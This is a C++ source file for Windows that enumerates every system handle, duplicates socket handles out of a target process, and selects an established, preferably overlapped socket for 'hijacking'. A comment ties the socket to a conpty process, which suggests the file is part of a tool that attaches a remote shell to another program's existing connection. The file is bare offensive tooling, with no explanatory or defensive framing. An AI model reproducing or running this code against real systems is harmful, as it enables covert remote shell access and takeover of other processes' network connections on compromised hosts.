#include "globals.h"
#include "hijacking.h"


bool IsSocketHandle(HANDLE hHandle)
{
    bool bRes = false;
    HMODULE hMod = LoadLibrary(_T("ntdll.dll"));
    if (hMod)
    {
        NtQueryObjectPtr NtQueryObject = (NtQueryObjectPtr)::GetProcAddress(hMod, "NtQueryObject");
        if (NtQueryObject)
        {
            ULONG OutSize = 0;
            NTSTATUS NtStatus = NtQueryObject(hHandle, ObjectTypeInformation, NULL, 0, &OutSize);
            vector<BYTE> buffer(OutSize);
            PPUBLIC_OBJECT_TYPE_INFORMATION TypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)&buffer[0];
            ULONG InSize = OutSize;
            NtStatus = NtQueryObject(hHandle, ObjectTypeInformation, TypeInfo, InSize, &OutSize);
            if (NT_SUCCESS(NtStatus))
            {
                if (0 == wcscmp(_T("File"), CString(TypeInfo->TypeName.Buffer, TypeInfo->TypeName.Length).GetBuffer()))
                {
                    NtStatus = NtQueryObject(hHandle, ObjectNameInformation, NULL, 0, &OutSize);
                    buffer = vector<BYTE>(OutSize);
                    PPUBLIC_OBJECT_NAME_INFORMATION NameInfo = (PPUBLIC_OBJECT_NAME_INFORMATION)&buffer[0];
                    InSize = OutSize;
                    NtStatus = NtQueryObject(hHandle, ObjectNameInformation, NameInfo, InSize, &OutSize);
                    if (NT_SUCCESS(NtStatus))
                    {
                        if (0 == wcscmp(_T("\\Device\\Afd"), NameInfo->Name.Buffer))
                        {
                            bRes = true;
                        }
                    }
                }
            }
        }
        FreeLibrary(hMod);
    }
    return bRes;
}


SOCKET_LIST FilterAndOrderSocketsByBytesIn(SOCKET_LIST& lstSocks)
{
    list<SOCKET_BYTESIN> lstSocketsBytesIn = list<SOCKET_BYTESIN>();
    SOCKET_LIST lstSocketsOut = SOCKET_LIST();
    for(auto it = lstSocks.begin(); it != lstSocks.end(); ++it)
    {
        SOCKET hSock = *it;
        TCP_INFO_v0* sockInfo = NULL;
        if (!GetSocketTcpInfo(*it, &sockInfo))
        {
            try
            {
                closesocket(hSock);
            }
            catch(...)
            {
            }
        }
        else
        {
            if (sockInfo->State == TCPSTATE::TCPSTATE_SYN_RCVD || sockInfo->State == TCPSTATE::TCPSTATE_ESTABLISHED)
            {
                SOCKET_BYTESIN sockBytesIn = { 0 };
                sockBytesIn.sock = hSock;
                sockBytesIn.bytes_in = sockInfo->BytesIn;
                lstSocketsBytesIn.push_back(sockBytesIn);
            }
            else
                closesocket(hSock);
            delete sockInfo;
        }
        
    }
    if (lstSocketsBytesIn.size() > 0)
    {
        if (lstSocketsBytesIn.size() > 1)
        {
            // ordering for fewer bytes received by the sockets we have a higher chance to get the proper socket
            lstSocketsBytesIn.sort([](const SOCKET_BYTESIN& sockin1, const SOCKET_BYTESIN& sockin2) { return sockin1.bytes_in < sockin2.bytes_in; });
        }
        for (auto it = lstSocketsBytesIn.begin(); it != lstSocketsBytesIn.end(); ++it)
        {
            lstSocketsOut.push_back(it->sock);
        }
    }
    
    return lstSocketsOut;
}

bool GetSocketTcpInfo(SOCKET hSock, TCP_INFO_v0** tcpInfoOut)
{
    ASSERT(tcpInfoOut != NULL);
    int iRes = -1;
    DWORD tcpInfoVersion = 0;
    DWORD bytesReturned = 0;
    DWORD tcpInfoSize = sizeof(TCP_INFO_v0);
    TCP_INFO_v0* pTcpInfo = new TCP_INFO_v0;
    iRes = WSAIoctl(hSock, SIO_TCP_INFO, &tcpInfoVersion, sizeof(tcpInfoVersion), pTcpInfo, tcpInfoSize, &bytesReturned, NULL, NULL);
    if (iRes == 0)
    {
        *tcpInfoOut = (TCP_INFO_v0*)pTcpInfo;
    }
    return iRes == 0;
}

SOCKET DuplicateSocketFromHandle(HANDLE hHandle)
{
    SOCKET hSock = NULL;
    SOCKET hDuplicatedSocket = NULL;
    WSAPROTOCOL_INFO wsaProtocolInfo;
    memset(&wsaProtocolInfo, 0, sizeof(WSAPROTOCOL_INFO));
    int status = WSADuplicateSocket((SOCKET)hHandle, GetCurrentProcessId(), &wsaProtocolInfo);
    if (status == 0)
    {
        // we need an overlapped socket for the conpty process but we don't need to specify the WSA_FLAG_OVERLAPPED flag here because it will be ignored (and automatically set) by WSASocket() function if we set the WSAPROTOCOL_INFO structure and if the original socket has been created with the overlapped flag.
        hDuplicatedSocket = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, &wsaProtocolInfo, 0, 0);
        if (hDuplicatedSocket != INVALID_SOCKET)
        {
            hSock = hDuplicatedSocket;
            try
            {
                CloseHandle(hHandle); // cleaning 
            }
            catch (...)
            {
            }
        }
    }
    return hSock;
}

SOCKET_LIST DuplicateSocketsFromHandles(HANDLE_LIST& lstHandles)
{
    SOCKET_LIST lstDupedSockets;
    for(auto it = lstHandles.begin(); it != lstHandles.end(); ++it)
    {
        SOCKET hDupSock = DuplicateSocketFromHandle(*it);
        if (hDupSock != INVALID_SOCKET)
        {
            lstDupedSockets.push_back(hDupSock);
        }
    }
    return lstDupedSockets;
}


UINT g_CurrentIndex = 0;

DWORD WINAPI ThreadProc(LPVOID lParams)
{
    THREAD_PARAMS* pThreadParams = (THREAD_PARAMS*)lParams;

    for (g_CurrentIndex; g_CurrentIndex < pThreadParams->pSysHandleInformation->dwCount; )
    {
        WaitForSingleObject(pThreadParams->hStartEvent, INFINITE);
        ResetEvent(pThreadParams->hStartEvent);
        pThreadParams->bStatus = false;
        SYSTEM_HANDLE& sh = pThreadParams->pSysHandleInformation->handles[g_CurrentIndex];
        g_CurrentIndex++;
        if (sh.dwProcessId == pThreadParams->dwProcessId)
        {
            HANDLE hDup = (HANDLE)sh.wValue;
            HANDLE hProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, sh.dwProcessId);
            if (hProcess)
            {
                bool bRes = DuplicateHandle(hProcess, (HANDLE)sh.wValue, GetCurrentProcess(), &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS) == TRUE;
                if (bRes != FALSE)
                {
                    if (IsSocketHandle(hDup))
                    {
                        pThreadParams->bStatus = true;
                    }
                    else
                    {
                        CloseHandle(hDup);
                    }
                }
                CloseHandle(hProcess);
            }
        }
        SetEvent(pThreadParams->hFinishedEvent);
    }
    return 0;
}

SOCKET_LIST GetTargetProcessSockets(DWORD dwProcessId)
{
    HRESULT hRes = E_FAIL;
    HANDLE hTargetProcess = NULL;
    SOCKET_LIST lstSocks;
    SOCKET_LIST lstDupSockets;
    HANDLE_LIST lstDupHandles;
    hTargetProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwProcessId);
    if (hTargetProcess == NULL)
    {
        WriteStdErr("ERROR: Cannot open target process for DuplicateHandle access\r\n");
    }
    else
    {
        CloseHandle(hTargetProcess);
        // Get the list of all handles in the system
        PSYSTEM_HANDLE_INFORMATION pSysHandleInformation = new SYSTEM_HANDLE_INFORMATION;
        DWORD size = sizeof(SYSTEM_HANDLE_INFORMATION);
        DWORD needed = 0;
        HMODULE hModule = LoadLibrary(_T("ntdll.dll"));
        if (hModule)
        {
            NtQuerySystemInformationPtr NtQuerySystemInformation = (NtQuerySystemInformationPtr)GetProcAddress(hModule, "NtQuerySystemInformation");
            if (NULL == NtQuerySystemInformation)
            {
                WriteStdErr("ERROR: GetProcAddress failed for NtQuerySystemInformation\r\n");
            }
            else
            {
                NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, pSysHandleInformation, size, &needed);
                if (!NT_SUCCESS(status))
                {
                    delete pSysHandleInformation;
                    if (0 == needed)
                    {
                        WriteStdErr("ERROR: NtQuerySystemInformatino failed\r\n");
                    }
                    else
                    {
                        // The previously supplied buffer wasn't enough.
                        size = needed;
                        BYTE* rawSystemHandleInformation = new BYTE[size];
                        pSysHandleInformation = (PSYSTEM_HANDLE_INFORMATION)rawSystemHandleInformation;
                        status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, pSysHandleInformation, size, &needed);
                        if (!NT_SUCCESS(status))
                        {
                            // some other error so quit.
                            delete pSysHandleInformation;
                        }
                        else
                        {
                            // No error so far
                            // Start thread for NtQueryObject call
                            g_CurrentIndex = 0;
                            THREAD_PARAMS ThreadParams = { 0 };
                            ThreadParams.dwProcessId = dwProcessId;
                            ThreadParams.pSysHandleInformation = pSysHandleInformation;
                            ThreadParams.hStartEvent = CreateEvent(0, TRUE, FALSE, 0);
                            ThreadParams.hFinishedEvent = CreateEvent(0, TRUE, FALSE, 0);
                            HANDLE hThread = NULL;
                            while (g_CurrentIndex < pSysHandleInformation->dwCount)
                            {
                                HANDLE hCurrentHandle = (HANDLE)pSysHandleInformation->handles[g_CurrentIndex].wValue;
                                if (!hThread)
                                {
                                    hThread = CreateThread(0, 0, ThreadProc, &ThreadParams, 0, 0);
                                }
                                if (hThread)
                                {
                                    ASSERT(ThreadParams.hStartEvent != INVALID_HANDLE_VALUE && ThreadParams.hStartEvent != NULL);
                                    ASSERT(ThreadParams.hFinishedEvent != INVALID_HANDLE_VALUE && ThreadParams.hFinishedEvent != NULL);
                                    ResetEvent(ThreadParams.hFinishedEvent);
                                    SetEvent(ThreadParams.hStartEvent);
                                    if (WAIT_TIMEOUT == WaitForSingleObject(ThreadParams.hFinishedEvent, 100))
                                    {
                                        CString csError;
                                        csError.Format(L"Query hang for handle %p", hCurrentHandle);
                                        OutputDebugString(csError);
                                        TerminateThread(hThread, 0);
                                        CloseHandle(hThread);
                                        hThread = NULL;
                                    }
                                    else
                                    {
                                        if (ThreadParams.bStatus)
                                        {
                                            lstDupHandles.push_back(hCurrentHandle);
                                        }
                                    }
                                }
                                else
                                    break;
                            }
                            delete[] rawSystemHandleInformation;
                            rawSystemHandleInformation = NULL;
                            pSysHandleInformation = NULL;
                            if (lstDupHandles.size() > 0)
                            {
                                lstDupSockets = DuplicateSocketsFromHandles(lstDupHandles);
                                if(lstDupSockets.size() > 0)
                                    lstSocks = FilterAndOrderSocketsByBytesIn(lstDupSockets);
                            }
                        }
                    }
                }
                FreeModule(hModule);
            }
            FreeLibrary(hModule);
        }
        else
        {
            WriteStdErr("ERROR: Failed to get module ntdll.dll\r\n");
        }
    }
    return lstSocks;
}


bool IsSocketOverlapped(SOCKET hSock)
{
    bool bRes = false;
    HMODULE hMod = LoadLibrary(_T("ntdll.dll"));
    if (hMod != NULL && hMod != INVALID_HANDLE_VALUE)
    {
        NtCreateEventPtr NtCreateEvent = (NtCreateEventPtr)::GetProcAddress(hMod, "NtCreateEvent");
        if (NtCreateEvent != NULL)
        {
            HANDLE hNtEvent = NULL;
            int ntStatus = -1;
            SOCKET_CONTEXT contextData;
            memset(&contextData, 0, sizeof(SOCKET_CONTEXT));
            ntStatus = NtCreateEvent(&hNtEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, false);
            if (NT_SUCCESS(ntStatus) && hNtEvent != NULL && hNtEvent != INVALID_HANDLE_VALUE)
            {
                NtDeviceIoControlFilePtr NtDeviceIoControlFile = (NtDeviceIoControlFilePtr)::GetProcAddress(hMod, "NtDeviceIoControlFile");
                if (NtDeviceIoControlFile != NULL)
                {
                    IO_STATUS_BLOCK IOSB;
                    ntStatus = NtDeviceIoControlFile((HANDLE)hSock, hNtEvent, NULL, NULL, &IOSB, IOCTL_AFD_GET_CONTEXT, NULL, 0, &contextData, sizeof(contextData));
                    // Wait for Completion 
                    if (ntStatus == NTSTATUS_PENDING)
                    {
                        WaitForSingleObject(hNtEvent, INFINITE);
                        ntStatus = IOSB.Status;
                    }
                    CloseHandle(hNtEvent);

                    if (NT_SUCCESS(ntStatus))
                    {
                        if ((contextData.SharedData.CreationFlags & WSA_FLAG_OVERLAPPED) != 0) bRes = true;
                    }
                    
                }
            }
        }
    }
    return bRes;
}

SOCKET DuplicateTargetProcessSocket(DWORD dwProcessId, bool& bOverlappedSocket)
{
    bOverlappedSocket = false;
    SOCKET hSock = INVALID_SOCKET;
    SOCKET_LIST lstSocks = GetTargetProcessSockets(dwProcessId);
    if (lstSocks.size() > 0)
    {
        for(auto it = lstSocks.begin(); it != lstSocks.end(); ++it)
        {
            SOCKET hCandidateSock = *it;
            // we prioritize the hijacking of Overlapped sockets
            if (IsSocketOverlapped(hCandidateSock))
            {
                hSock = hCandidateSock;
                bOverlappedSocket = true;
                break;
            }
        }
        // no Overlapped sockets found, We try with the first socket
        if (hSock == INVALID_SOCKET) 
        {
            WriteStdErr("DEBUG: No overlapped sockets found. Trying to return also non-overlapped sockets...\r\n");
            hSock = lstSocks.front();
        }
        // close duplicated socket handle not returned to avoid leaking handles.
        for (auto it = lstSocks.begin(); it != lstSocks.end(); ++it)
        {
            if (*it != hSock) closesocket(*it);
        }
    }
    return hSock;
}

bool SetSocketBlockingMode(SOCKET hSock, int iMode)
{
    // iMode == 1 => non blocking else blocking
    ULONG ulNonBlocking = iMode == 1 ? 1 : 0;
    int iResult = ioctlsocket(hSock, FIONBIO, &ulNonBlocking);
    if (iResult != 0)
        WriteStdErr("ERROR: ioctlsocket failed\r\n");
    return iResult == 0;
}